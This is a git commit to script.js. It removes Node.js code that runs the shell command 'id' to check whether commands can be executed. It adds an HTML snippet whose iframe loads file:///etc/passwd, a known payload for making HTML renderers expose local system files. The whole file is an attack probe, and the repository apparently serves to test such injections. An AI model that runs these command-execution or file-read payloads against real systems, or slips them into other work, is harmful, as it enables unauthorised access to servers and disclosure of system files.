c1d509f4b306322b6b4a17793f6579865697a12f
Ouerfelli Mohamed Amine <119965790+Ouerfelli-1@users.noreply.github.com>
2024-09-05 11:56:12 +0100

    Update script.js

--- script.js
+++ script.js
@@ -1,12 +1,1 @@
-const { exec } = require('child_process');
-
-// Execute the 'id' command
-exec('id', (err, stdout, stderr) => {
-    if (err) {
-        console.error(`Error: ${stderr}`);
-        return;
-    }
-    
-    // Print the output of the 'id' command
-    console.log(`ID Command Output:\n${stdout}`);
-});
+<div><p>Report Heading</p><iframe src=”file:///etc/passwd” height=”500” width=”500”>
